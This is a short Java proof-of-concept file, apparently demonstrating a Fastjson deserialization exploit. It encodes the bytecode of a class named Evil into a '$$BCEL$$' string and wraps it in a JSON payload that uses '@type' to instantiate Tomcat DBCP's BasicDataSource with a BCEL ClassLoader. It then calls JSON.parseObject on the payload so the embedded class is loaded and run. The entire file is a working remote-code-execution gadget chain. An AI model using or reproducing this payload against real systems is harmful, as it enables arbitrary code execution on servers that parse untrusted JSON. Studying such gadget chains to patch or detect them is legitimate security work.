package com.ocean;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

import java.io.IOException;
import java.sql.SQLException;

public class BcelLoad {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
        JavaClass javaClass = Repository.lookupClass(Evil.class);
        String encode =  Utility.encode(javaClass.getBytes(), true);
        String s = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":" +
                    "\"$$BCEL$$" + encode + "\",\"driverClassloader\":" +
                    "{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSON.parseObject(s);

        }
    }